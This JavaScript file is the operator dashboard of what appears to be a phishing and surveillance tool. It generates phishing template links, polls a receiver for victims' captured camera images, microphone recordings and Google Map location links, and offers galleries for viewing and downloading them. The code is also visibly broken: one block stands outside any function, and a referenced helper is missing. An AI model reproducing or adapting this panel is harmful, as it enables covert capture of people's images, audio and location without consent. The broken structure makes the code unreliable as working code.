var old_data = '';
var log_history = []; // Store logs for download

// Load Images from API
function loadImages() {
    console.log("Loading images...");
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/images', true);
    
    xhr.onload = function() {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('images-gallery');
            if (!container) return;
            
            if (response.images && response.images.length > 0) {
                var html = '';
                response.images.forEach(function(img) {
                    html += `
                        <div class="image-item" data-url="${img.url}">
                            <img src="${img.url}" alt="${img.name}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Crect fill=%22%23333%22 width=%22100%25%22 height=%22100%25%22/%3E%3Ctext fill=%22%23999%22 x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22%3EError%3C/text%3E%3C/svg%3E'"/>
                            <div class="image-filename">${img.name}</div>
                            <div class="image-overlay">
                                <button onclick="viewFullImage('${img.url}')"><i class="fas fa-search"></i> View</button>
                                <button onclick="downloadImage('${img.url}', '${img.name}')"><i class="fas fa-download"></i> Download</button>
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `
                    <div class="no-content">
                        <i class="fas fa-camera"></i>
                        <p>No images captured yet</p>
                    </div>
                `;
            }
        } catch (e) {
            console.error("Error loading images:", e);
            var container = document.getElementById('images-gallery');
            if (container) {
                container.innerHTML = `
                    <div class="no-content">
                        <i class="fas fa-exclamation-circle"></i>
                        <p>Error loading images</p>
                    </div>
                `;
            }
        }
    };
    
    xhr.onerror = function() {
        console.error("Error fetching images");
        var container = document.getElementById('images-gallery');
        if (container) {
            container.innerHTML = `
                <div class="no-content">
                    <i class="fas fa-exclamation-circle"></i>
                    <p>Error loading images</p>
                </div>
            `;
        }
    };
    
    xhr.send();
}

// Load Audio files from API
function loadAudio() {
    console.log("Loading audio...");
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/audio', true);
    
    xhr.onload = function() {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('audio-list');
            if (!container) return;
            
            if (response.audio && response.audio.length > 0) {
                var html = '';
                response.audio.forEach(function(audio) {
                    var timestamp = new Date(audio.timestamp * 1000).toLocaleString();
                    html += `
                        <div class="audio-item">
                            <div class="audio-icon">
                                <i class="fas fa-volume-up"></i>
                            </div>
                            <div class="audio-info">
                                <div class="audio-filename">${audio.name}</div>
                                <div class="audio-details">${timestamp}</div>
                            </div>
                            <div class="audio-player">
                                <audio controls>
                                    <source src="${audio.url}" type="audio/wav">
                                    Your browser does not support the audio element.
                                </audio>
                            </div>
                            <div class="audio-controls">
                                <button class="audio-btn" onclick="downloadAudio('${audio.url}', '${audio.name}')">
                                    <i class="fas fa-download"></i> Download
                                </button>
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `
                    <div class="no-content">
                        <i class="fas fa-microphone"></i>
                        <p>No audio recordings yet</p>
                    </div>
                `;
            }
        } catch (e) {
            console.error("Error loading audio:", e);
            var container = document.getElementById('audio-list');
            if (container) {
                container.innerHTML = `
                    <div class="no-content">
                        <i class="fas fa-exclamation-circle"></i>
                        <p>Error loading audio</p>
                    </div>
                `;
            }
        }
    };
    
    xhr.onerror = function() {
        console.error("Error fetching audio");
        var container = document.getElementById('audio-list');
        if (container) {
            container.innerHTML = `
                <div class="no-content">
                    <i class="fas fa-exclamation-circle"></i>
                    <p>Error loading audio</p>
                </div>
            `;
        }
    };
    
    xhr.send();
}

// View full image in modal/popup
function viewFullImage(url) {
    var width = window.innerWidth * 0.9;
    var height = window.innerHeight * 0.9;
    var left = (window.innerWidth - width) / 2;
    var top = (window.innerHeight - height) / 2;
    window.open(url, 'imageViewer', `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`);
}

// Download image
function downloadImage(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

// Download audio
function downloadAudio(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

// Clear all images
function clearAllImages() {
    if (confirm('Are you sure you want to delete all images? This action cannot be undone.')) {
        // TODO: Implement backend endpoint to clear images
        Swal.fire({
            icon: 'info',
            title: 'Clear All',
            text: 'Image deletion feature requires backend implementation',
            timer: 2000
        });
    }
}

// Clear all audio
function clearAllAudio() {
    if (confirm('Are you sure you want to delete all audio recordings? This action cannot be undone.')) {
        // TODO: Implement backend endpoint to clear audio
        Swal.fire({
            icon: 'info',
            title: 'Clear All',
            text: 'Audio deletion feature requires backend implementation',
            timer: 2000
        });
    }
}
    $.post("receiver.php", { "send_me_result": "" }, function (data) {
        if (data != "") {
            // Parse data if possible or handle raw string
            // The PHP backend seems to send raw strings.

            var timestamp = new Date().toLocaleTimeString();
            var logType = 'info';
            var displayData = data;

            if (data.includes("Image")) {
                show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
                logType = 'image';
            } else if (data.includes("Audio")) {
                show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
                logType = 'image'; // Reuse color for media
            } else if (data.includes("Google Map")) {
                show_notif("Google Map Link", data.slice(18), true);
                logType = 'success';
            }

            // Append to Terminal
            var logEntry = `
                <div class="log-entry">
                    <span class="log-time">[${timestamp}]</span>
                    <span class="log-content ${logType}">${displayData}</span>
                </div>
            `;

            $("#log-terminal").append(logEntry);

            // Auto scroll to bottom
            var terminal = document.getElementById("log-terminal");
            terminal.scrollTop = terminal.scrollHeight;

            // Store for download
            log_history.push(`[${timestamp}] ${data}`);
        }
    });
}

function getFullLogs() {
    return log_history.join("\n");
}

function show_notif(msg, path, status) {
    var btn_text = 'open file';
    var timer = 5000;
    var type_notif = "success";

    if (msg.includes("available")) {
        btn_text = "open link";
        timer = 0;
        type_notif = "danger";
    } else if (msg.includes("Google Map")) {
        btn_text = "open link";
        timer = 0;
    }

    GrowlNotification.notify({
        title: msg,
        description: path,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true,
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function () {
                    window.open(path.replace("Path : ", ""), 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function () { }
            }
        },
    });
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

function saveTextAsFile(textToWrite, fileNameToSaveAs) {
    var textFileAsBlob = new Blob([textToWrite], { type: 'text/plain' });
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000) + "_" + fileNameToSaveAs;
    if (window.webkitURL != null) {
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}

function check_new_version() {
    // Version check disabled
    return;
}

// Initialize on page load
window.addEventListener('load', function() {
    console.log("=========== PAGE LOADED ===========");
    console.log("Window object:", typeof window);
    console.log("Document object:", typeof document);
    
    // Wait a bit to ensure DOM is ready
    setTimeout(function() {
        console.log("Initializing dashboard after DOM ready...");
        
        // Load phishing templates
        console.log("Step 1: Loading templates...");
        loadPhishingTemplates();
        
        // Start listener
        console.log("Step 2: Starting listener...");
        var timer = setInterval(Listener, 2000);
        var isListening = true;
        
        // Bind tab buttons
        console.log("Step 3: Binding tab buttons...");
        var tabButtons = document.querySelectorAll('.tab-btn');
        console.log("Found " + tabButtons.length + " tab buttons");
        
        tabButtons.forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log("===== TAB BUTTON CLICKED =====");
                console.log("Event:", e);
                console.log("Button element:", this);
                console.log("Button classes:", this.className);
                
                var tabName = this.getAttribute('data-tab');
                console.log("Tab name from data-tab:", tabName);
                
                // Hide all tabs
                console.log("Hiding all tabs...");
                document.querySelectorAll('.tab-content').forEach(function(tab) {
                    console.log("Removing active from tab:", tab.id);
                    tab.classList.remove('active');
                });
                
                // Remove active class from all buttons
                console.log("Removing active from all buttons...");
                document.querySelectorAll('.tab-btn').forEach(function(b) {
                    console.log("Removing active from button:", b.textContent.trim());
                    b.classList.remove('active');
                });
                
                // Show selected tab
                var targetTab = document.getElementById('tab-' + tabName);
                console.log("Target tab ID:", 'tab-' + tabName);
                console.log("Target tab found:", targetTab !== null);
                if (targetTab) {
                    console.log("Adding active to tab:", targetTab.id);
                    targetTab.classList.add('active');
                }
                
                // Add active to button
                console.log("Adding active to button");
                this.classList.add('active');
                
                // Load content if needed
                if (tabName === 'images') {
                    console.log("Loading images...");
                    loadImages();
                } else if (tabName === 'audio') {
                    console.log("Loading audio...");
                    loadAudio();
                }
                
                console.log("===== TAB SWITCH COMPLETE =====");
            });
        });
        
        // Bind refresh/clear buttons
        console.log("Step 4: Binding control buttons...");
        var btnRefreshImages = document.getElementById('btn-refresh-images');
        if (btnRefreshImages) {
            btnRefreshImages.addEventListener('click', function() {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadImages();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }
        
        var btnClearImages = document.getElementById('btn-clear-images');
        if (btnClearImages) {
            btnClearImages.addEventListener('click', clearAllImages);
        }
        
        var btnRefreshAudio = document.getElementById('btn-refresh-audio');
        if (btnRefreshAudio) {
            btnRefreshAudio.addEventListener('click', function() {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadAudio();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }
        
        var btnClearAudio = document.getElementById('btn-clear-audio');
        if (btnClearAudio) {
            btnClearAudio.addEventListener('click', clearAllAudio);
        }
        
        // Listen button
        console.log("Step 5: Binding listen button...");
        var btnListen = document.getElementById('btn-listen');
        if (btnListen) {
            btnListen.addEventListener('click', function() {
                if (isListening) {
                    clearInterval(timer);
                    console.log("Listener stopped");
                    this.innerHTML = '<i class="fas fa-play"></i> Start Listener';
                    this.classList.remove('btn-danger');
                    this.classList.add('btn-success');
                    isListening = false;
                } else {
                    timer = setInterval(Listener, 2000);
                    console.log("Listener started");
                    this.innerHTML = '<i class="fas fa-stop"></i> Stop Listener';
                    this.classList.remove('btn-success');
                    this.classList.add('btn-danger');
                    isListening = true;
                }
            });
        }
        
        // Clear logs button
        console.log("Step 6: Binding clear button...");
        var btnClear = document.getElementById('btn-clear');
        if (btnClear) {
            btnClear.addEventListener('click', function() {
                var terminal = document.getElementById('log-terminal');
                if (terminal) {
                    terminal.innerHTML = `
                        <div class="log-entry">
                            <span class="log-time">[System]</span>
                            <span class="log-content">Logs cleared. Waiting for interactions...</span>
                        </div>
                    `;
                }
                log_history = [];
            });
        }
        
        // Download logs button
        console.log("Step 7: Binding download button...");
        var btnDownload = document.getElementById('btn-download');
        if (btnDownload) {
            btnDownload.addEventListener('click', function() {
                saveTextAsFile(getFullLogs(), 'log.txt');
            });
        }
        
        console.log("=========== INITIALIZATION COMPLETE ===========");
    }, 100);
});

function loadPhishingTemplates() {
    console.log("Loading phishing templates...");
    console.log("Current location:", window.location.href);
    console.log("Making request to: /list_templates.php");
    
    // Use XMLHttpRequest for better compatibility
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/list_templates.php', true);
    
    xhr.onreadystatechange = function() {
        console.log("XMLHttpRequest readyState:", xhr.readyState, "status:", xhr.status);
        
        if (xhr.readyState === 4) {
            console.log("Response received");
            console.log("Response status:", xhr.status);
            console.log("Response text:", xhr.responseText);
            console.log("Response type:", typeof xhr.responseText);
            
            try {
                var data = JSON.parse(xhr.responseText);
                console.log("Parsed data:", data);
                console.log("Data is array:", Array.isArray(data));
                console.log("Data length:", data.length);
                
                var container = document.getElementById('links-container');
                console.log("Container found:", container !== null);
                
                if (!container) {
                    console.error("links-container not found!");
                    return;
                }
                
                var html = '';
                if (Array.isArray(data) && data.length > 0) {
                    console.log("Processing " + data.length + " templates");
                    data.forEach(function(template, idx) {
                        console.log("Template " + idx + ":", template);
                        var url = "http://" + location.host + "/t/" + template.trim() + "/";
                        console.log("Generated URL:", url);
                        html += `
                            <div class="link-item">
                                <span class="link-url">${url}</span>
                                <button class="btn-copy" onclick="copyToClipboard(this, '${url}')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        `;
                    });
                    console.log("Generated HTML length:", html.length);
                } else {
                    console.log("No templates or not an array");
                    html = '<p style="color: var(--text-muted); padding: 20px; text-align: center;">No phishing templates available</p>';
                }
                
                container.innerHTML = html;
                console.log("Container updated");
            } catch (e) {
                console.error("Error parsing templates:", e);
                console.error("Error message:", e.message);
                var container = document.getElementById('links-container');
                if (container) {
                    container.innerHTML = '<p style="color: #ef4444; padding: 20px;">Error loading templates: ' + e.message + '</p>';
                }
            }
        }
    };
    
    xhr.onerror = function() {
        console.error("XMLHttpRequest error occurred");
        console.error("Status:", xhr.status);
        console.error("Status text:", xhr.statusText);
        var container = document.getElementById('links-container');
        if (container) {
            container.innerHTML = '<p style="color: #ef4444; padding: 20px;">Error loading templates</p>';
        }
    };
    
    xhr.onprogress = function(event) {
        console.log("Progress:", event.loaded, "bytes");
    };
    
    console.log("Sending XMLHttpRequest...");
    xhr.send();
    console.log("XMLHttpRequest sent");
}

function copyToClipboard(btn, url) {
    navigator.clipboard.writeText(url).then(() => {
        var originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
        setTimeout(() => {
            btn.innerHTML = originalText;
        }, 2000);
        
        if (window.Swal) {
            Swal.fire({
                icon: 'success',
                title: 'Copied!',
                text: url,
                timer: 1500,
                showConfirmButton: false
            });
        }
    }).catch(err => console.error('Copy failed:', err));
}